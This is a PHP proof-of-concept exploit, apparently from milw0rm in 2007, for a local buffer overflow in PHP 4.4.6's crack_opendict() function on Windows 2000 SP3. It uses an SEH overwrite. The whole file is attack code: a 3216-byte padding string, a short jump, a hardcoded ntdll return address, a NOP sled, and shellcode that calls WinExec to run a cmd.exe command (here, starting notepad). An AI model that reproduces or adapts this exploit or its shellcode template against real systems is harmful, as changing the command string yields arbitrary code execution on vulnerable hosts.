<?php
//PHP 4.4.6 crack_opendict() local buffer overflow poc exploit
//win2k sp3 version / seh overwrite method
//to be launched from the cli

// by rgod
// site: http://retrogod.altervista.org

if (!extension_loaded("crack")){
die("you need the crack extension loaded.");
}

$____scode=
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\xca\x73\xe9\x77". //WinExec
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\x5c\xcf\xe9\x77". //ExitProcess
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"start notepad & ";

$jmp="\xeb\x06\x06\xeb"; // jmp short
$eip="\x86\xa0\xf8\x77"; // call ebx, ntdll.dll
$____suntzu.=str_repeat("A",3216);
$____suntzu.=$jmp.$eip.str_repeat("\x90",12).$____scode;
crack_opendict($____suntzu);

?>

# milw0rm.com [2007-03-08]